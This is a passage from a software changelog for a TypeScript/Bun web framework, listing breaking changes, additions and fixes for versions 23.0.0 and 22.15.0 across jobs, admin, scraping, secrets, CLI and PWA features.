  An island state id the states file does not declare is `X_TEST_ISLAND_STATE_UNKNOWN`.
- **storage:** `memoryDriver()`. **auth:** `apiKeyResolver(() => store)`.

CI and tooling (this repository).

- **ci:** the gate runs as five parts — `unit` in three shards, `live` with the static steps,
  `e2e` with `typecheck` — and `verify` merges them. Both tracked apps, both scaffold forms and the
  `packages` job are matrices. Test services come from `docker/docker-compose.test.yml`, in RAM,
  with their URLs in `docker/test-services.env`.
- **scripts:** `bun run schema-dumps` regenerates both tracked apps' dumps (`--check` reports);
  `bun run seal-calls` refuses an AES call outside three core modules; `scripts/scaffold-admin.ts`
  boots a scaffold and walks its admin; `coverage-gate --all --shard i/n`, and `scripts/` is a
  coverage unit. `new-error-code` takes `--status <n>` or `--off-socket` for a tier ≤ 4 package and
  writes the CLI's `CLI_FIXES` row. `seal-calls` reports `X_SEAL_CALL_OUTSIDE_CORE` /
  `X_SEAL_CALL_UNSCANNED`.
- **scripts:** `new-error-code` requires `--cause '<what usually makes it happen>'` (it was
  `--meaning`, defaulting to the title) and refuses one equal to `--title`; `doc-fixes` reports a
  wiki cause cell that echoes its title as `X_DOC_CAUSE_ECHOES_TITLE`. `package-shape` refuses a
  published package whose `files` does not negate `!src/**/*-fixture.ts`; scraping's recorded
  browser moved to `driver-recorded.ts` (`fixtureBrowser`, same name).

### Changed

What an existing app meets, in the order it meets it.

- **BREAKING — the image builds its own island store.** `x build --target docker` no longer writes
  `.x/islands/`. Add one line to `docker/Dockerfile`, in the runtime stage, after `COPY . .` and
  above `ENV NODE_ENV=production`: `RUN bun node_modules/@ultimat3/cli/src/bin.ts build --target
  prebuilt`. Without it the image still serves, every web pod compiles every island and stylesheet
  at boot, and each boot logs `X_IMAGE_NOT_PREBUILT` naming the line. `app.config.ts` must import
  with no deployment environment while `NODE_ENV` is unset. Measured on the demo app's image
  (`oven/bun:1.4-alpine`, read-only root), 2026-10-01: a web pod is ready in 1.6–1.7 s, was
  4.2–4.8 s; settled RSS 97–102 Mi, was 215–220 Mi.
- **BREAKING — `ROLE=worker` and `ROLE=scheduler` import less of the app.** They import
  `apps/web/api/index.ts` and every module that reaches no component (`.tsx`) or stylesheet. A
  module a job depends on only by side effect (`defineService`, `defineStorage`, `defineCatalogs`)
  that also imports a component must be imported from the API index. The smaller load needs
  `x.manifest.json` and a stamped `BUILD_ID` in the image; without either the role imports the whole
  app and logs the fix. A job or task the manifest names and the load did not register is
  `X_ROLE_LOAD_INCOMPLETE`, logged, and answered by importing everything; the `manifest` step
  reports the same gap at build time. Measured on the demo app under container conditions,
  2026-10-01: a worker is ready in 1.2 s, was 3.8 s; settled RSS 98 Mi, was 224 Mi.
- **BREAKING — an app with a migration must commit `packages/db/schema/`.** The `drift` step is
  `X_SCHEMA_DUMP_DRIFT` without it. Run `x db gen` once and commit the directory, with
  `schema/** linguist-generated=true text eol=lf` in `packages/db/.gitattributes`. `x db gen` and
  `x db migrate` now boot a scratch embedded database and need `@electric-sql/pglite` installed —
  without it the fix is `bun add -d @electric-sql/pglite   # then: x db gen`. A release that changes
  a framework table changes the `framework/` half of every app's dump; this one does (`x_jobs`,
  `x_outbox`, `x_scheduler_state`, and `x_job_pauses`, `x_job_workers`, `x_job_counters`,
  `x_admin_audit`), so re-run `x db gen` after upgrading.
- **BREAKING — migrations must replay on the embedded database.** PGlite's contrib extensions are
  linked automatically (`x dev` links them too, so `create extension citext` now applies there). An
  extension it does not ship (`vector`, `postgis`) replays on a real server: set `TEST_DATABASE_URL`
  (or `DATABASE_URL`) to one that has it, with a role that may create a database, in CI and wherever
  `x db gen` runs. Without it: `X_SCHEMA_DUMP_DRIFT` naming the extension and the variable.
- **BREAKING — `x db gen` exits 1 when the dump cannot be produced**, after writing the migration.
  The cause leads with the migration that was written; do not regenerate it.
- **BREAKING — `x db migrate` reports `unexpected-object`** (`X_DB_DRIFT`) and exits 1 when the dev
  database holds a trigger, function, view, type or sequence no migration creates. `DriftKind` gains
  `'unexpected-object'`: an exhaustive `switch` needs the case.
- **BREAKING — an app states a coverage floor.** With no `coverage` in `x.verify.json` the `unit`
  step is `X_COVERAGE_FLOOR_UNSTATED`, and the finding carries the line to add with the app's
  measured numbers. Coverage is of the whole source tree — a file no unit test loads counts at 0% —
  and only the unit suite counts. Under the floor is `X_COVERAGE_BELOW_FLOOR`, naming the ten worst
  files. A floor under 95 needs a `"why"`, and one the tree has passed by 1.5 points is
  `X_COVERAGE_FLOOR_STALE`. An `exclude` entry is `{ "glob", "why" }`; `x doctor` prints them.
- **BREAKING — a gate step has a deadline.** 8 minutes for `unit`, `contract`, `live`, `job`, `e2e`
  and `eval`; 5 for every other step. Past it the step is `X_VERIFY_STEP_TIMEOUT` and its processes
  are killed. `"stepTimeoutMs": { "unit": 900000 }` in `x.verify.json` raises one.
- **BREAKING — `x verify --json` writes one line per finished step to stderr**
  (`{"step":"lint","ok":true,"ms":21987}`). stdout is still one document. A caller that parses
  `2>&1` as JSON reads stdout only.
- **BREAKING — an app's `unit` step runs as fixed slices of test files**, one plain `bun test`
  process per slice of at most 16 neighbouring files, not `bun test --parallel`. A test that
  depended on which files shared a worker may order differently. `x test unit` is unchanged.
- **BREAKING — a raw request in browser code fails `x verify`.** The `boundaries` step reports
  `X_BROWSER_TRANSPORT_BYPASS` for a `fetch(`, `new WebSocket(`, `new XMLHttpRequest(` or
  `new EventSource(` in any `*.island.tsx`, any module that calls `clientTransport` / `pageClient`,
  or anything either imports — the app's own `packages/*` included. A `route.ts`, a job, a task and
  a test are not browser code. No allowlist, no flag. Each finding's `fix:` is the replacement call.
- **BREAKING — a server barrel in browser code fails `x verify`.** `X_BROWSER_SERVER_BARREL`: a
  value import of `@ultimat3/entity` or `@ultimat3/query` in that same closure. Import
  `@ultimat3/entity/record` or `@ultimat3/query/client`; `import type` is unaffected.
- **BREAKING — `x.manifest.json` changes shape.** An `admin` section is always written — each
  resource's filters, sorts, scopes, row scope, `sections`, `formGroups`, `related` and `actions`,
  and the audit store's `kind` — a job that declares `concurrency` gains
  `concurrency: { limit, keyed, whenBusy }` on its row, and one that declares `onSettled` gains
  `onSettled: true`. The `manifest` step is `X_MANIFEST_DRIFT` until `x manifest` is run.
- **BREAKING — a `defineAdmin()` the app scan cannot reach is `X_ADMIN_UNSCANNED`.** The scan
  imports `apps/*/{site,app,api,shared}/**`; an admin under `apps/*/src/` never ran and `/admin`
  answered 404. The `manifest` step names the file:
  `git mv apps/admin/src/index.ts apps/admin/app/admin/admin.ts`, then repoint its imports.
- **BREAKING — the `policy` step checks a mounted admin's permissions.** Each permission a mounted
  admin route asks for that no role grants is `X_PERMISSION_UNGRANTED`, one finding per permission
  per mount. Grant `admin:read` and `<table>:read|write|delete` — plus `job:read` / `job:manage`
  for the jobs dashboard and `audit:read` for the audit screen — in the role map. A wildcard grant
  (`orgs:*`) counts when its prefix is declared, and the finding names the app's real role-map file.
- **BREAKING — the `i18n` step checks the keys a mounted admin renders.** A locale lacking a
  resource title, field label, section, scope, column, nav, action label (`admin.action.<name>` when
  no `labelKey`), action input label (`admin.input.<action>.<field>`) or branding key is
  `X_CATALOG_MISSING_KEYS`; the page drew `⟦admin.<table>.title⟧` with the step green. The list is
  `AdminApp.catalogKeys()`. `en` is answered by the framework's catalog; a non-`en` app adds the
  framework admin keys to its own.
- **BREAKING — `x g entity` / `x g resource` write a `repo.ts` over the typed handle**:
  `import { db } from '@<app>/db'`, `byId`, `list(limit)`, `insert` — no `sql`, no `decodeRow`, no
  org argument. `list(limit)` replaces `listByOrg(orgId, limit)`; the handle scopes every read to
  the actor's org, and a read under an actor with no org is `X_TENANCY_ACTOR_ORG_REQUIRED`.
  Existing repos keep working. In an app scaffolded before 23.0.0 the first `x g entity` creates
  `packages/db/src/client.ts` and exits 1 with `X_DB_HANDLE_UNREGISTERED` naming the line to add to
  `packages/db/src/index.ts`.
- **BREAKING — `x g resource <name> --feature <other>` is refused** (`X_CLI_BAD_FLAG`). The flag
  was ignored and the slice landed in two directories. Drop it.
- **BREAKING — `--live` on any `x g` but `query` is refused** (`X_CLI_BAD_FLAG`). On a resource it
  did nothing — the slice's list query is already live. The fix names the generator that takes it:
  `x g query <name>-feed --feature <name> --live`.
- **BREAKING — `x g query` / `x g resource` generate a read with no `orgId` input.** The input is
  `{ limit }`; the org is the actor's, scoped by the typed handle, and the generated `can<X>Read`
  checks only that the actor has an org. Already-generated slices keep working; a caller of a
  newly generated query passes `{ limit }`.
- **BREAKING — `x g admin:page` writes `apps/admin/app/admin/pages/`** (was `apps/admin/src/pages`,
  outside the app scan). Move existing pages: `git mv apps/admin/src/pages apps/admin/app/admin/pages`,
  then update the import in `apps/admin/app/admin/admin.ts`.
- **BREAKING — `x tasks` opens the app's queue when a task is declared**, to show each task's last
  fire beside its next; with no reachable queue it fails as `x jobs ls` does. `--json` rows gain
  `lastMs`, `last`, `lastFiredAtMs`.

Jobs.

- **BREAKING — `JobRunArgs.finalAttempt` and `JobRunArgs.progress` are required.** A test that
  calls `<job>.run({ … })` by hand adds `finalAttempt: isFinalAttempt(<job>.retry, attempt)` and
  `progress: () => undefined`. TS2741 names each site.
- **BREAKING — job types gain members.** `JobOutcome` gains `'refused'` and `'dropped'`;
  `QueueStats` gains `failed`; `WorkerStats` gains `refused`, `dropped`, `pollDelayMs`; `JobHandle`
  gains `whenBusy` and `concurrencyKeyFor()`; `JobDescriptor` gains `concurrency` and `onSettled`;
  `JobRecord` gains `progress` and `lastErrorStack`; `JobTrace` gains `concurrencyKey`, `input`,
  `stack`, `progress`. A hand-built literal or an exhaustive `switch` adds the member.
- **BREAKING — a settle names its claim.** `JobDriver.ack` / `nack` take `{ workerId, claim }` and
  answer `Promise<boolean>`; `ClaimedJob` carries `claim`. `driver.ack(id)` becomes
  `driver.ack(id, claimOf(claimed))`. A hand-written driver increments a claim ordinal in `claim()`,
  fences both settles on it, files a row `failed` when `NackOptions.fail` is set
  (`nackState(options)`), and honours `EnqueueRequest.id` by answering the existing job,
  `deduped: true`. A worker that re-claimed its own lapsed job could have that claim settled by
  the body it had lost.
- **BREAKING — `JobIntrospection` gains required members**: `remove`, `requeueMany`, `removeMany`,
  `promote`, `promoteMany`, `pauseQueue`, `resumeQueue`, `pausedQueues`, `pauseTask`, `resumeTask`, `pausedTasks`,
  `recordTaskFire`, `taskFires`, `announceWorker`, `forgetWorker`, `workers`, `recordProgress`,
  `counters`, `counterTotals`, `rollupCounters`. `list()` answers one page of at most 200 rows —
  walk with `list({ after: jobCursor(lastRow) })`; a larger limit or a foreign cursor is
  `X_JOB_PAGE_INVALID`.
- **BREAKING — hand-written job stores gain members.** `LeaseStore.holders(key)`;
  `SchedulerState.fire(driver, { task, occurrenceMs, jobs })`; `LeaderElection.renewEveryMs`
  (`0` asks before every dispatch); `FleetSlots.acquire` answers a `SlotGrant`, not a boolean.
- **BREAKING — `EventBus` gains `stored` and `now()`**, both required, and `createPgEventBus` takes
  no `clock`: `published_at` and the expiry are the database's `now()`. `eventPrompt()` refuses a
  bus with `stored: false` outside development and test (`X_DRIVER_UNAVAILABLE`).
- **BREAKING — a staged `enqueue()` answers the job's real `id` and `runId`.** It answered the
  outbox row's id and `''`. `OutboxRecord.runId` is required and `x_outbox` gains `run_id`; a
  hand-written `OutboxStore` persists it.
- **BREAKING — `retry: { deadLetter: false }` settles an exhausted job `failed`** (outcome
  `dropped`). It was re-queued and re-run forever.
- **BREAKING — an invalid `concurrency` is `X_JOB_DECLARATION_INVALID`**, not `X_INVARIANT`:
  `0`, a negative, a fraction, `NaN`, `Infinity`.
- **BREAKING — a failed job row's `lastError` ends with ` — fix: <the error's fix>`** when the
  error is an `UltimateError`. Code that compared `lastError` to a rendered message compares a
  prefix.
- **BREAKING — the memory job driver stores a payload's JSON form**, as Postgres does. A `Date`
  arrives as a string; an `undefined` member and a non-enumerable property do not arrive.
- **BREAKING — `exportRows({ sink })` takes a thunk**: `sink: () => disk('exports')`, resolved per
  write. A value evaluated `disk()` at module load, before boot; it is now a type error, and at
  runtime `definition.sink is not a function` on the first part.
- **jobs:** idle polling. A worker waits `pollIntervalMs` (250 ms) while passes find work and
  doubles to `idlePollMaxMs` while they do not — 2 s, or 5 s once the wake is proven; an idle pass
  is one claim over every queue. The outbox relay does the same from `intervalMs` (200 ms). An idle
  scheduler reads no store. Measured 2026-10-01, idle statements a minute: a scheduler with 35
  tasks 4,321 → 6; a worker over 2 queues 480 → 12 claims once the wake is proven; the relay
  300 → 12; a whole idle worker pod 28. Enqueue in one process to start in another, Postgres 17 on
  loopback, median of 6: 8 ms with the wake, ≤ 250 ms on the old fixed poll.
  Through a transaction-pooling proxy the wake is never proven (`jobs.wake.unverified`, once) and
  pickup is bounded by the 2 s poll. There is no option for the old fixed interval.
- **jobs:** `X_JOB_DECLARATION_INVALID`'s title is "the job declaration is missing or mis-declares
  a field". `x jobs drain` no longer counts a moved row as a completed run. `x jobs show`,
  `retry` and `cancel` load the app, so a keyed run shows its `concurrencyKey`.

Client, realtime, entity, secrets.

- **BREAKING — a wrong `pathStyle` is answered `X_CONTRACT_DRIFT`, not `X_ROUTE_NOT_FOUND`.** Still
  a 404; the cause names the style the server serves. A browser passes no `pathStyle` — delete it
  from `rpc({ … })` in island code.
- **BREAKING — a live query's source is read as its subscriber's tenant.** A window is keyed by
  query, input and tenant, and read in a context that carries the org. A source naming another org
  is `X_TENANCY_ACTOR_MISMATCH`; a subscriber with no org reading a tenant-scoped table is
  `X_TENANCY_ACTOR_ORG_REQUIRED`. Drop hand-written org arguments from live repo reads.
  `LiveQueryDefinition.snapshot` receives `{ input, tenant }`; cursors minted before the upgrade
  cost one snapshot.
- **BREAKING — `EntityCore<Row>['$schema']` is `Schema<unknown, unknown>`.** Read the output type
  off the `entity()` result (`typeof posts.$schema`). `RecordProjection` gains a required
  `sealed: readonly string[]`; a projection built by hand adds `sealed: []`.
- **BREAKING — `x secrets rotate` keeps the replaced master key.** After a rotation
  `secrets.enc.json` holds `ULTIMATE_SECRETS_RETIRED_KEYS` and `installSecrets()` puts it in the
  environment. Nothing to edit unless something asserts on the file's exact contents; drop a retired
  key with `x secrets rotate --drop <keyId>` once nothing is sealed under it.

UI, CLI and testing exports.

- **BREAKING — `LinkProps`, `PaginationProps` and `DataTableProps<Row>` are unions**, one interface
  per mode. A type that extends one extends a member instead: `TextLinkProps` / `ButtonLinkProps`,
  `PaginationCallbackProps` / `PaginationLinkProps`, `DataTableCallbackProps<Row>` /
  `DataTableLinkProps<Row>`. JSX call sites are unchanged.
- **BREAKING — `Guard.check` is `check(root, sources)`.** A guard written as `check(root)` keeps
  working. A test that calls `guard.check(root)` itself passes `guardSources(root)` from
  `@ultimat3/cli` as the second argument.
- **BREAKING — `@ultimat3/cli` drops `checkAppBoundaries`** (nothing in the gate called it), and
  `BUILD_TARGETS` is `docker | binary | static | prebuilt`: an exhaustive `switch` over
  `BuildTarget` needs the fourth case.
- **BREAKING — `useE2eDriver`'s driver receives a third argument**, the test's `{ timeoutMs }`. A
  hand-written driver that ignores it drops the deadline.
- **BREAKING — `E2eApp` has a required `log(): string`**, the spawned app's bounded output; a failed
  e2e test now carries its last 40 lines. A hand-written `E2eApp` double adds `log: () => ''`.
- **BREAKING — `runJobs` drives a real worker.** Each pass is an unstarted worker's `tick()`, so
  keyed `concurrency` waits, `whenBusy: 'fail'` refuses with `X_JOB_KEY_BUSY`, and runs claimed in
  one pass run concurrently, not one after another. A test that expected two runs of one key to
  both complete sees a refusal or a wait.
- **BREAKING — `runJobs` renews its lease on the test clock** as a real worker does. A test that
  `clock.advance()`s past the visibility timeout while a run is in flight sees `X_JOB_LEASE_LOST`;
  a test that cancels a running job and awaits `runJobs.drain()` adds `clock.advance(1)` after the
  cancel. `WorkerOptions.schedule` (`IntervalScheduler`) is the one seam for every renewal.
- **BREAKING — the app test preload resets the jobs event bus before every test** (only when
  `@ultimat3/jobs` is already loaded). An event published in `beforeAll` is gone by the test that
  reads it: publish inside the test.
- **BREAKING — a published package's `files` must negate `!src/**/*-fixture.ts`.** A fixture
  reachable from an entry point is `X_PACKAGE_SHAPE` naming the file to rename. Private packages —
  every generated app's — are exempt.
- **BREAKING — a `robots: { index: false }` document carries no `og:*`, `article:*` or `twitter:*`
  tag.** A page that may not be indexed has no link preview either; there is no switch.
- **ui:** `Spinner` turns in 640 ms (was 700 ms), `Skeleton` shimmers in 1.28 s (was 1.4 s), and the
  default focus ring reads `--stroke-thick`: a page that does not load the theme sheet loses its
  ring width. An app sheet that defines its own `respond-down`, `respond-between`, `rem` or `fluid`
  shadows the framework's; the `raw-breakpoint` and `raw-length` guards refuse the local copy.
- **ui:** the unknown-breakpoint `@error` reads `X_TOKEN_UNKNOWN: respond-to("<name>") — that
  breakpoint is not in $breakpoints. fix: use one of sm, md, lg, xl, 2xl`, unquoted.
- **cli:** `x <command> --json --verbose` carries a green step's output, as the terminal does.
  `x dev` with no `METRICS_PORT` binds a free metrics port when 9090 is taken; a declared port and
  every container still refuse. An app module that fails to import at container boot is logged at
  `error`, once per module; it was dropped silently.
- **testing:** a green `bun test` prints no framework log line — both preloads install a sink.
  `LOG_LEVEL=info bun test <file>` prints them; `LOG_LEVEL=warn` or higher filters the terminal and
  no longer raises the process logger's threshold. `setLogSink` is core's seam.
  `@ultimat3/testing` depends on `@ultimat3/http`.

Admin.

- **BREAKING — the admin is served by the framework.** `defineAdmin` without a `db` handle that
  carries each entity (or `resources.<entity>.repo`) throws `X_ADMIN_REPO_UNBOUND`: write
  `defineAdmin({ entities, db })`. Delete every `page.tsx` that serves an admin URL, any `AdminRepo`
  adapter and any action route for admin buttons — a page file on a path the admin mounts is
  `X_ROUTE_DUPLICATE`. The demo app deleted 1,781 lines.
- **BREAKING — `guardedPage`, `AdminRouteConfig.component` and `RegisteredRepo` are removed.** Use
  `route.respond({ ctx, params, url, method, form })`, or `guardedScreen(app, route, body)`.
  `adminRouteConfig(route)` is `adminRouteConfig(app, route)`. `AdminList`, `AdminDetail`,
  `AdminForm`, `AdminActions` and `AdminLayout` take no event handlers and no `loading`.
- **BREAKING — the admin list API.** `AdminListProps.hrefFor` is `(location: ListLocation) =>
  string` — `hrefFor={(location) => listHref(basePath, resource, location)}` — and `request`,
  `scope`, `counts` are required. `pageRequestOf()` returns an `AdminListRequest` and throws
  `X_ADMIN_FILTER_INVALID` for an unknown sort field, direction, scope, filter or parameter; they
  were ignored. `adminList(resource, ctx, request)` takes `{ cursor, limit, sort, scope, filters }`.
  `AdminField.relation` is `{ entity }`. `CrudResult` has a fourth member,
  `{ ok: false, kind: 'missing', audit }`.
- **BREAKING — the tenant column is not an admin field.** Not a form field, a list column or a
  filter; a create is stamped with the acting actor's tenant and a posted value for it is ignored.
  A read by a malformed id answers `null` (the admin's 404); it threw `X_INVARIANT_VIOLATED`.
- **BREAKING — `describeRoutes()` lists routes a package mounts** (`mount: { by, permissions }`,
  `file: '@ultimat3/admin'`), and `Stylesheet` has a required `claimed` field.
- **BREAKING — every `defineAdmin()` serves the jobs dashboard.** Resources `x_jobs`,
  `x_job_queues`, `x_job_tasks`, `x_job_workers` and the overview at `/admin/jobs`. Delete a
  hand-written jobs page and nav item; a `pages:` entry at those paths is
  `X_ADMIN_PAGE_PATH_INVALID`. A test that renders `/admin/jobs` installs a queue first:
  `setJobDriver(createMemoryDriver())`.
- **BREAKING — `DefineAdminInput.jobs` and `AdminApp.jobs` are removed.** The dashboard reads the
  queue. Delete the option; TS2353 names the site.
- **BREAKING — `AuditLog.entries()` is async and takes `AuditQuery`** (`entity`, `entityId`,
  `actorId`, `orgId`, `limit`, `before`, `changes`). Write `await log.entries(…)`. A hand-written
  `AuditLog` adds `atomic(run)` and `kind`.
- **BREAKING — `InvokeResult` failures carry `kind`**: `'denied' | 'not-applicable' | 'invalid'`.
  Narrow on `kind === 'denied'` before reading `decision`.
- **BREAKING — a posted row action redirects to the row** (303), not the list.
- **BREAKING — an admin create or update whose resulting row falls outside `rows(actor)` is
  refused** before the repo is called, and audited as `admin.error.row-out-of-scope` — screens and
  MCP alike. A text `gt`/`lt` row scope cannot be decided and refuses the write.
- **BREAKING — an admin action on a row the actor cannot see is refused**, with or without `when`:
  a row that is gone or outside `rows` is `X_ADMIN_ACTION_NOT_APPLICABLE` (409; the same over MCP).
  It ran the handler.
- **BREAKING — `permissionsForOperation('admin', op)` answers one permission**, not
  `admin:read` twice.
- **admin:** every admin document is `noindex,nofollow`; the admin's stylesheet is carried by the
  `app` surface only (−5,251 B on the demo app's `site/` sheet); enum cells render as a badge and
  reference cells as the target's label; `contains` treats `%` and `_` as characters. The default
  authz is `roleAuthz()`: a role needs `admin:read|write|destroy`, `job:read`, `audit:read` and
  each table's `<table>:read|write|delete`, and `admin:destroy` implies `admin:write` implies
  `admin:read`, as `staticAuthz` answers. A resource's permissions are named after
  `AdminResource.permission` (default: the entity's name). An action's input field is labelled
  `admin.input.<action>.<field>`. The dashboard's operation matrix lists only the operations a
  resource offers.

Scraping.

- **BREAKING — `storageSessionStore` seals every stored session** under the app's master key. Run
  `x secrets init` (or set `ULTIMATE_SECRETS_KEY`) before the first run; without a key the scrape
  fails with `X_SEAL_KEY_MISSING` before its browser opens. **Sessions and refusal markers stored
  before this release are deleted on first load.** The run logs in again, and a credential the site
  had already refused is presented once more — on a site that locks an account after repeated
  failures, correct the credential before the first run after upgrading.
- **BREAKING — `storageSessionStore` and `scrape({ artifacts: { storage } })` take a thunk.**
  `storageSessionStore(disk)` becomes `storageSessionStore(() => disk('sessions'))`; a driver value
  is TS2345.
- **BREAKING — scraping types gain required members.** `createPrompt(scrape, handler, page)` is
  `createPrompt({ scrape, handler, page, runId, clock, … })`; `PromptRequest` gains `runId`,
  `index`, `clock`, `signal`, `keepAlive`, `input`; `AuthContext` gains `runId`; `ScrapeSecrets`
  gains `conceal(value)`; `ScrapeReport` gains `usage`; `SessionInit.logger` is required. A handler
  or a run body is unaffected; a value built by hand adds the members.
- **BREAKING — `X_SCRAPE_CDP_ATTACH_FAILED` names the endpoint by scheme and host only.**
  `meta.cdpUrl` is `wss://host:port`, never the full URL: a connect URL carries a token.
- **BREAKING — a proxy URL with credentials on `localBrowser({ proxy })` is not passed to
  `--proxy-server` with its userinfo**; the page authenticates. A launcher whose page has no
  `authenticate()` fails with `X_SCRAPE_EGRESS_UNSUPPORTED` — upgrade the launcher or drop the
  credentials from the URL.

Scaffold and generator output — new apps and new slices; nothing rewrites a file an app holds.

- **cli:** the scaffolded `packages/db/src/index.ts` exports the typed handle (`db`, `driver`,
  `selectDriver` from `./client`). `app.config.ts` declares `defineMeasurementActor`. Route files
  export `Page`. `apps/web/app/auth/dev-actor.ts` exports `devAuthenticate`, and a cookie naming an
  undeclared role is anonymous, not admin. The admin is `apps/admin/app/admin/admin.ts`, a
  declaration with no page file, on `roleAuthz()`.
- **cli:** `x g backfill` reads and writes `db.<table>` and updates one row at a time by primary
  key. A backfill generated earlier with `upsertAll(rows, { onConflict: ['id'] })` on a
  tenant-scoped entity never completed (`X_TENANCY_UNSCOPED`); replace the write with
  `db.<table>.update(row.id, { … })`.
- **cli:** `x g resource`'s plural route is reachable as written: `load` reads the list through the
  slice's query as the request's actor, `AsyncRegion` renders ready / empty / refused, the form
  island is mounted, the route declares `policy: { permission: '<name>:read' }` and a measured
  `budget.js` of `64kb` (58,522 B on `x new`'s app, Bun 1.4.0, 2026-10-01) with its `measured:` /
  `why:` comment, inside `Shell` when `apps/web/shared/shell.tsx` exists. The run prints a fourth
  step, `x build --target static && x verify --only budgets`. Emitted tests mint actors with
  `testActor()`.
- **cli:** `X_BUDGET_EXCEEDED`'s `fix:` names the route file, the next whole kb and the
  `// measured: <N> B … — why:` line to paste. **render:** `h(Component, props)` checks `props`
  against the component's own props type.
- **cli:** a generated query's SQL orders `createdAt` descending, as its in-memory source does; an
  already-generated one keeps ascending until edited. `x g` with no `--locales` writes catalog keys
  to every locale that has a catalog, and a catalog merge keeps the file's own key order.
- **cli:** the dev compose `x new` writes runs Versity S3 Gateway (`versity/versitygw:v1.8.0`,
  region `auto`) instead of MinIO. The bucket is the volume's mount path and exists on the first
  `up`. Objects in a MinIO volume are not readable by the gateway; re-upload them.

### Fixed

- **action, query:** `rpc<Api['actions']>` and `queryClient<Api['queries']>` typecheck past 47
  modules ([#534](https://github.com/developerz-ai/ultimate/issues/534)). `Merge` in `defineApi`
  cost one instantiation level per module, so the 48th was TS2589 whatever each exported. Measured
  with `tsc --extendedDiagnostics`, 2026-10-01: 100 modules × 3 actions + 50 × 2 queries is 850,546
  instantiations and 0 errors; 300 × 5 + 100 × 3 (1,500 actions) is 3,782,244 and 0 errors.
- **realtime:** a live query read in a sync node threw `X_TENANCY_UNSCOPED` for every subscriber
  whose source took its tenant from the actor, and one pre-policy read was shared across orgs.
  A failed live snapshot reaches the page as the branded error the server sent, not `X_INTERNAL`.
- **jobs:** a job enqueued inside a transaction could not be named by the action that started it.
  A relay `stop(deadline)` joining a manual stop never bound its deadline. A wake landing on a pass
  in flight forked a second poll chain. A scheduler fire is one atomic statement fenced on the
  watermark.
- **entity:** the memory driver compares an ISO instant with a zone as Postgres does; it compared
  characters, so page 2 of a list sorted by a timestamp was empty.
- **storage:** `s3Driver` answers a request signed for the wrong region with `X_CONFIG_INVALID`
  naming the region to set, from `put`, `copy`, `list` and `delete`. It was a bare `S3Error` from
  `put` and an IAM-grants fix from the other two.
- **ui:** `respond-to('2xl')`, the quoted form, failed with `X_TOKEN_UNKNOWN`.
- **cli:** `x db gen` printed "no migration needed" while its outcome was blocked by an unrelated
  finding. A `fix:` naming a scoped package (`@scope/name`) renders runnable. `x verify`'s test
  counts carry errored files. [#589](https://github.com/developerz-ai/ultimate/issues/589): a job
  cancelled mid-gate left a log with nothing in it.
- **realtime:** after an `updateWhere` / `deleteWhere` on any table, the next live change reached
  no subscriber. Every window was marked stale, and the re-read's position equalled the change's,
  so the duplicate guard returned before re-snapshotting. Invalidation is scoped to the windows
  reading the written entity, and a re-read window re-snapshots every subscriber.
- **admin:** the `/_x` DB panel's refusal named `x db psql --write`, which does not exist; it says
  `psql "$DATABASE_URL"`.
- **wiki:** guard counts point at `SHIPPED_GUARD_NAMES` instead of stating a number
  ([#443](https://github.com/developerz-ai/ultimate/issues/443)).

### Removed

- **jobs:** the wiki's `rateLimit:` job field and the architecture doc's `concurrency_key` SQL —
  neither ever existed in code.

### Commits

- docs(upgrading): 23.0.0 is released
- feat: platform readiness for big systems — plan 101 (#600)
- docs(plans): platform readiness for big systems (#598)

## 22.15.0 - 2026-10-01

### Added

- **core, render, cli:** Speculation Rules on every document that carries no client router —
  `navigation.speculation: { prefetch: 'moderate' | 'conservative' | false, exclude?: string[] }`
  in `app.config.ts`, **on by default** at `'moderate'`. Such a document carries one
  `<script type="speculationrules">` and the browser fetches a link's document on pointer rest, so a
  full-page navigation between prerendered pages paints from memory at 0kb of JavaScript. PREFETCH
  only, never prerender. The rules are an allow-list built from the route table: a prerendered,
  shareable page (`static`/`isr`, no policy) of a surface without the router, and a page that
  declared `navigation: 'prefetch'` on a client-routed one — in every routed locale
  (`{/en}?/precios`). Never a `navigation: 'document'` page, an `ssr` page of a surface without the
  router, an `offline: 'network-only'` page, an `api/` route, or anything outside the route table
  (`/_storage/*`, `/mcp*`, an app's plain routes). `exclude` subtracts URL patterns. The body is
  admitted to `script-src` by its sha256, hashed from the string the document carries, and is
  charged no bytes against `budget.js` (it is data, like `application/json`). `x dev`, the
  container and `x build --target static` write the same tag.
- **pwa:** navigation preload. The emitted worker enables `registration.navigationPreload` on
  `activate` and every strategy answers a navigation from `event.preloadResponse` — the request the
  browser made while the worker was starting — falling back to its own fetch when there is none.
  A preloaded answer from another build posts `AppUpdateAvailable` and stops the worker stamping
  its build id, as a 409 did. `fromNetwork` and `StrategyOptions.preload` are the same rule for the
  exported strategy functions.

### Changed

- **pwa:** the install pre-cache is filled `PRECACHE_CONCURRENCY` (4) entries at a time. It was
  `Promise.all` over every entry — 72 requests, 2.9 MB on notificado.co — on the first visit,
  against the connection the visitor's first click needs. A failed entry still costs that entry only.
- **cli:** a `render: 'static'` page answers a matching `If-None-Match` with a bodiless `304`. The
  ETag was only ever a header: every revalidation got the whole document again.
- **cli:** the container renders a `render: 'static'` page once per locale and answers later
  requests from memory, without running `load` or the render (`static-document.ts`): a page with no
  dynamic segment, asked for with no query string, that answered 200 — at most 1,024 documents.
  `x dev` renders per request, as before. `ssr`, `isr`, `stream` and every `no-store` page are
  untouched.

### Fixed

- **cli:** the served `static` document memo is bounded by **bytes** as well as by entry count
  (`STATIC_MEMO_MAX_BYTES`, 32 MiB of keys and bodies). The key carries the request origin when the
  app declares none, so rotating `Host` headers could retain up to 1,024 whole documents; past
  either bound a page is rendered per request, as before, never refused.
- **core:** a `navigation.speculation` that is not an object (`speculation: 'off'`, `null`, a list)
  is refused with `X_CONFIG_INVALID`. `mergeNavigation` dropped it silently, so the app ran at
  `'moderate'` — the default it believed it had turned off.
- **core, cli:** `loadSpeculation` validates through core's new `resolveSpeculation`, the same
  validator `defineConfig` runs, and **refuses** what it used to coerce: an eagerness not offered
  became `'moderate'`, a non-string `exclude` entry was dropped, a pattern not starting with `/`
  was kept.
- **wiki:** the markers on the pages 22.15.0 touched are month-level (`As of 2026-09`), the
  repository's convention.

### Commits

- fix(core,cli): #594 review — static memo bounded by bytes, non-object speculation refused, loadSpeculation validates instead of coercing (#596)
- feat(navigation,pwa): static pages prefetch each other, the worker preloads navigations, a static page answers 304 (#594)

## 22.14.0 - 2026-09-30

### Added

- **mcp, cli:** several MCP endpoints per app, one per population. `apps/<app>/mcp.ts` may export
